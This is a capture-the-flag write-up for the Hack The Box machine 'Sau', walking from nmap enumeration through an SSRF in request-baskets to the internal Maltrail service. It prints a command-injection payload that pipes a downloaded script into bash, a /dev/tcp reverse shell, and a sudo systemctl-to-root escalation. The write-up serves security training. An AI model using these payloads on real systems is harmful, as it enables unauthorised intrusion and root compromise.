![Pasted image 20230712084222](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5bc82cfc-c172-413b-88d6-4b662bb15c7f)

# Enumeration

nmap scan:
```
Nmap scan report for 10.129.14.50
Host is up (0.081s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 12 Jul 2023 12:43:03 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 12 Jul 2023 12:42:37 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 12 Jul 2023 12:42:37 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=7/12%Time=64AE9FBD%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2012\x20Jul\x20
SF:2023\x2012:42:37\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2012\x20Jul\x20
SF:2023\x2012:42:37\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
SF::\x20nosniff\r\nDate:\x20Wed,\x2012\x20Jul\x202023\x2012:43:03\x20GMT\r
SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:44
Completed NSE at 13:44, 0.00s elapsed
Initiating NSE at 13:44
Completed NSE at 13:44, 0.00s elapsed
Initiating NSE at 13:44
Completed NSE at 13:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.77 seconds

```

There are a handful of ports open:
- 22 - SSH. Not likely without finding credentials first
- 80 - http, but it's filtered...
- 8338 - unknown, filtered
- 55555 - open, some kind of http service. 

Port 80 doesn't let me go anywhere at this time...

Checking 55555: 

![Pasted image 20230712084823](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/a0ba6a68-f88f-458b-8930-ba860dfa481b)

We have a site, a form we can play with, and a website version number. Lots to work with... 
Functionally, there is a token created when entering in a "basket"

![Pasted image 20230712085050](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/d2983fe6-6935-40f9-9eab-def2e1698956)

Strange, but okay. Probably can be messed with... Best not to overthink things. 

Some quick google searches reveal that there is a CVE for this product affecting versions 1.2.1 and earlier... hey look at that, that's what they are running. 
This site details a POC for this: https://notes.sjtu.edu.cn/s/MUUhEymt7
Additional info that may be helpful: https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3

# Foothold

I was able to get a packet back from the server. I snagged a post request using Burp. Here is the post code:
```http
POST /api/baskets/test2 HTTP/1.1
Host: 10.129.14.50:55555
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://10.129.14.50:55555
DNT: 1
Connection: close
Referer: http://10.129.14.50:55555/web
Sec-GPC: 1
Content-Length: 153

{
  "forward_url": "http://10.10.14.103:1234/test2",
  "proxy_response": false,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```
And using netcat, I get the following back:
```
$ nc -lvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.14.50.
Ncat: Connection from 10.129.14.50:58464.
GET /test2 HTTP/1.1
Host: 10.10.14.103:1234
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Dnt: 1
Sec-Gpc: 1
Upgrade-Insecure-Requests: 1
X-Do-Not-Forward: 1

```
Looks like it's a get request back to the URL I gave it. Maybe I can point it to a shell?
I tried pointing it to my machine hosting a php reverse shell, which does download it to the victim, but navigating to it, just has me download it back to my machine... 

**Progress!**
I didn't need to get fancy. I just needed to have the following set in any request to create a basket:
```html
{
  "forward_url": "http://127.0.0.1:80",
  "proxy_response": false,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```
so I tried it out. After creating a new basket, I opened it in the program and tried to go to the URL it mentioned:
Basket Created: x1myp9q
http://10.129.14.50:55555/x1myp9q

>**IMPORTANT NOTE**
>You'll need to open the basket on the web page and go into the settings. Enable the proxy response. It won't be by default. (I suppose one could just set it to true in the initial request.) 

Results:

![Pasted image 20230712104207](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/a436be01-ccc3-4b19-a3b0-07c793f60b93)

New information! We are in a program called Maltrail.

> What is happening here?
> When I created the basket, the code I added to the POST request forwards the traffic to the service running on port 80 which is normally filtered. Since it doesn't filter the local host, I can now get to it through this basket I made. 

Googling the service version, I found a GitHub repo and it's change logs. 
```
- Version 0.54 -> 0.55 (01 Mar 2023)

[!] Fixed unauthenticated OS command injection vulnerability in http.py (Issue #19146)
[=] Minor update for _process_packet func in sensor (Issue #19129)
[=] Multiple updates and optimizations for regular static trails and the whitelist
```

There is an OS command injection vulnerability in http.py. 
I checked the issue number and it contains a link to a bug bounty for the program. 
https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
```
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```
Essentially the POC sends a request to the login page on 8338 with some special data... In this case, the username field doesn't filter special characters so a semicolon will end the field then you can add OS commands.
Unfortunately that content is filtered so I need to find a way to include that into my method above... Maybe I can create a new basket and have it point to the login page, and then curl from my end to the basket... 

I'll make a new basket with the following post request:
```http
POST /api/baskets/kpaj0nh HTTP/1.1
Host: 10.129.14.50:55555
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://10.129.14.50:55555
DNT: 1
Connection: close
Referer: http://10.129.14.50:55555/web
Sec-GPC: 1
Content-Length: 0

{
  "forward_url": "http://127.0.0.1:8338/login",
  "proxy_response": false,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```

And going to that page give us...

![Pasted image 20230712113541](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5a145a06-4d28-43ce-80f5-0351eb06e2f5)

Neat!
I think we can work with that. Let's try to curl to it with our method...

```bash
curl 'http://10.129.14.50:55555/kpaj0nh' \ --data 'username=;`curl 10.10.14.103 | bash`'
```

Failed... I'll probably have to encode the data somehow in my request...

Very strange... I send the following post request:


and get the reply
```
$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.14.50.
Ncat: Connection from 10.129.14.50:46922.
GET / HTTP/1.1
Host: 10.10.14.103:1337
User-Agent: curl/7.68.0
Accept: */*

```
But if I try anything, it breaks... no other method I try gives me a reply back... 

CHATGPT TO THE FRIGGIN RESCUE!!!

for some reason, curl can't handle it. I needed to create a quick reverse shell bash script:

```bash
#!/bin/bash 
bash -i >& /dev/tcp/10.10.14.103/1337 0>&1
```
I then set up a simple python http server to host the file. 
I then sent this request:
```http
POST /l5kkz1z HTTP/1.1
Host: 10.129.14.50:55555
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 50

username=;`curl 10.10.14.103:4443/shell.sh | bash`
```
This  will curl the code form my `shell.sh` program and then pipe it into bash. I then just need to have a listener waiting:
```
$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.14.50.
Ncat: Connection from 10.129.14.50:52554.
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$ ls /home/puma/user.txt
user.txt
puma@sau:~$ 

```
Woo!! User down. Time for root!

# Escalation
Go for low hanging fruit. Let's see if I can sudo anything...
```
puma@sau:~$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
puma@sau:~$ 

```

so I can run systemctl with a specific parameter. 
According to GTFOBins, It runs this command in `less` which should let me use `!sh` to run bash. I just need to make the shell interactive. 

Now I just run the `sudo /usr/bin/systemctl status trail.service` and then `!sh` which gives me this:
```
Jul 12 17:46:00 sau sudo[2189]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=root ; COMMAND=/usr/bin/systemctl stat>
Jul 12 17:46:00 sau sudo[2189]: pam_unix(sudo:session): session opened for user root by (uid=0)
lines 1-30/30 (END) ::!!lines 1-30/30 (END)lines 1-30/30 (END)!sshh!sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
go  root.txt
# 
```
Sau is PWNED!!!
